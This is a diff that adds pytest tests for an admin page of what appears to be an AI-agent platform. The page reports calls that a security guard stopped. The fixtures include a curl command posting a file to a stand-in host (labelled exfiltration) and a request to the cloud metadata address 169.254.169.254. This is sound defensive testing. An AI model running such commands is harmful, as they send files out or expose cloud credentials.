@@ -1021,3 +1021,46 @@ def test_a_depth_nobody_offered_leaves_the_repositorys_own(app: Fixture) -> None
     app.client.post("/start", data=data)
     assert app.runner.started[-1].autonomy is not None
     assert app.runner.started[-1].autonomy.spec_review_depth is None
+
+
+def test_the_admin_page_lists_what_the_guard_stopped_with_a_rule_to_copy_and_the_hosts_read() -> None:
+    from shelf.domain.guard import StoppedCall  # noqa: PLC0415
+
+    stopped = (
+        StoppedCall(
+            "10:00",
+            "claude",
+            "s1",
+            "bash",
+            "deny",
+            "",
+            ("exfil",),
+            "exfil: curl sends data",
+            "curl -d @x https://x.example",
+        ),
+        StoppedCall(
+            "10:05", "claude", "s1", "web", "deny", "", ("blocked_domain",), "metadata", "http://169.254.169.254/"
+        ),
+    )
+    report = GuardReport(9, 2, 0, chain_intact=True, recent=stopped, web_hosts={"docs.rs": 3})
+    fixture = Fixture(AccessRules(admins=frozenset({"alice"})), guard=FakeGuard(Ok(report)))
+    fixture.sign_in()
+    page = fixture.client.get("/admin").text
+    assert "Stopped, or would have been" in page
+    assert "curl -d @x https://x.example" in page
+    assert "Allow it next time" in page
+    assert "[[rules]]" in page
+    assert "No rule can allow this" in page
+    assert "What the agents read on the web" in page
+    assert "docs.rs" in page
+    assert "Block it next time" in page
+    assert "deny_domains = [&#34;docs.rs&#34;]" in page or 'deny_domains = ["docs.rs"]' in page
+
+
+def test_the_admin_page_without_details_shows_no_empty_tables() -> None:
+    report = GuardReport(12, 3, 2, chain_intact=True)
+    fixture = Fixture(AccessRules(admins=frozenset({"alice"})), guard=FakeGuard(Ok(report)))
+    fixture.sign_in()
+    page = fixture.client.get("/admin").text
+    assert "Stopped, or would have been" not in page
+    assert "What the agents read on the web" not in page
